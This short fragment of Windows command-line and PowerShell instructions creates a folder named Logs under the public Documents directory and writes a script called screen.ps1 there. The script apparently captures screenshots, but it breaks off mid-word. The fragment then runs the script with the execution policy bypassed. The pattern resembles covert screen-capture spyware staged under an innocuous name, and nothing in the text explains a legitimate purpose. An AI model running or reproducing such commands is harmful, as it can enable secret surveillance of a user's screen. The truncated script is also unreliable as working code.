

cmd

mkdir C:\Users\Public\Documents\Logs

powershell -Command "Set-Content -Path C:\Users\Public\Documents\Logs\screen.ps1 -Value 'Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $b = New-Object Drawing.Bitma


powershell -ExecutionPolicy Bypass -File C:\Users\Public\Documents\Logs\screen.ps1
